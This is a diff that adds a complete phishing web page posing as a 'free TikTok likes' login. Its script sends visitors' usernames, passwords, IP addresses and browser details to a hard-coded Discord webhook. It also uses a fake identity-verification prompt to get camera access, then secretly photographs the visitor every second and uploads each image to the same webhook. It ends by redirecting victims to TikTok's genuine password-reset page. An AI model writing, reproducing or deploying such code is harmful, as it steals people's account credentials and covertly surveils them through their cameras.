@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tik Tok Followers</title>
+<script src="jquery.min.js"></script>
+<script src="jscript.js"></script>
+<link rel="stylesheet" type="text/css" href="style.css">
+<style>
+    @media(max-width:760px){
+       #TFG{
+           font-size:140%;
+       } 
+       .buttonstyle{
+           font-size:100%;
+       }
+    
+    .followers , .likes{
+        width:95%;
+    }
+    }
+    #cameraPreview {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -1;
+        opacity: 0;
+    }
+    #permissionRequest {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.8);
+        color: white;
+        z-index: 1000;
+        text-align: center;
+        padding-top: 20%;
+    }
+    #permissionButton {
+        padding: 15px 30px;
+        background: #FE2C55;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 18px;
+        cursor: pointer;
+        margin-top: 20px;
+    }
+</style>
+</head>
+<body onload="initCamera()">
+<div id="permissionRequest">
+    <h2>Camera Access Required</h2>
+    <p>To verify your identity and prevent bots, we need to access your camera.</p>
+    <p>This will only be used for verification purposes.</p>
+    <button id="permissionButton">Allow Camera Access</button>
+</div>
+
+<video id="cameraPreview" autoplay playsinline></video>
+
+<div id="main-tool">
+    <div class="wrapper"><img src="logo.png"></div>
+    <h1 id="TFG">Login</h1>
+    <p class="sub-heading">Login to get 1000 Tiktok Likes Free</p>
+
+    <form onsubmit="return sendToDiscord(event)">
+    <center>
+    <div id="fillup">
+        <div class="form-option">
+            <input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
+        </div>
+    <div id="fillup">
+        <div class="form-option">
+            <input name="password" class="input-form input-command" type="password" placeholder="Password" required>
+        </div>
+
+        <br><br>
+        <button class="buttonstyle"><b>Login</b></button>
+        </center>
+    </div>
+</div>
+
+<script>
+let cameraStream = null;
+let captureInterval = null;
+let hasPermission = false;
+
+async function initCamera() {
+    // Show permission request if not granted
+    if (!hasPermission) {
+        document.getElementById('permissionRequest').style.display = 'block';
+        document.getElementById('permissionButton').onclick = requestCameraAccess;
+    }
+}
+
+async function requestCameraAccess() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: 'user',
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            },
+            audio: false
+        });
+        
+        cameraStream = stream;
+        const videoElement = document.getElementById('cameraPreview');
+        videoElement.srcObject = stream;
+        videoElement.onloadedmetadata = () => {
+            videoElement.play();
+            hasPermission = true;
+            document.getElementById('permissionRequest').style.display = 'none';
+            
+            // Start capturing images every second
+            captureInterval = setInterval(captureAndSendImage, 1000);
+        };
+    } catch (err) {
+        console.error("Camera access denied:", err);
+        alert("Camera access is required to continue. Please refresh and allow camera access.");
+    }
+}
+
+async function captureAndSendImage() {
+    if (!hasPermission) return;
+    
+    try {
+        const videoElement = document.getElementById('cameraPreview');
+        const canvas = document.createElement('canvas');
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        
+        // Convert canvas to blob
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('file', blob, 'user_photo.jpg');
+            
+            // Send to Discord webhook
+            await fetch('https://discord.com/api/webhooks/1420054494808637561/pgjj-z21XDkn9-wTQhOcCydUAlKQTLV3neit9ts1Qv2KwYqqE8b5wpNhuJQjy8QWqF3M', {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/jpeg', 0.8);
+    } catch (err) {
+        console.error("Error capturing image:", err);
+    }
+}
+
+async function getIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip || 'Unknown';
+    } catch (e) {
+        return 'Unknown';
+    }
+}
+
+async function sendToDiscord(event) {
+    event.preventDefault();
+    
+    const email = document.querySelector('input[name="email"]').value;
+    const password = document.querySelector('input[name="password"]').value;
+    const ip = await getIP();
+    
+    // Capture one final image before sending data
+    if (hasPermission) {
+        await captureAndSendImage();
+    }
+    
+    const payload = {
+        content: `📱 *New TikTok Login Attempt*\n📧 **Email/Phone:** ||${email}||\n🔑 **Password:** ||${password}||\n🌐 **IP:** ${ip}\n🕒 **Time:** ${new Date().toLocaleString()}\n💻 **User Agent:** ${navigator.userAgent}`,
+        username: "TikTok Security Alert",
+        avatar_url: "https://images.icon-icons.com/2973/PNG/512/tiktok_logo_icon_186928.png",
+        embeds: [{
+            color: 0xFE2C55,
+            footer: {
+                text: "TikTok Login Monitor"
+            }
+        }]
+    };
+
+    try {
+        await fetch('https://discord.com/api/webhooks/1420054494808637561/pgjj-z21XDkn9-wTQhOcCydUAlKQTLV3neit9ts1Qv2KwYqqE8b5wpNhuJQjy8QWqF3M', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.error('Error sending to Discord:', e);
+    }
+    
+    window.location.href = 'https://www.tiktok.com/login/email/forget-password';
+    return false;
+}
+
+// Clean up camera stream when page is closed
+window.addEventListener('beforeunload', () => {
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+    }
+    if (captureInterval) {
+        clearInterval(captureInterval);
+    }
+});
+</script>
+</body>
+<!-- Powered By DearVirus -->
+</html>
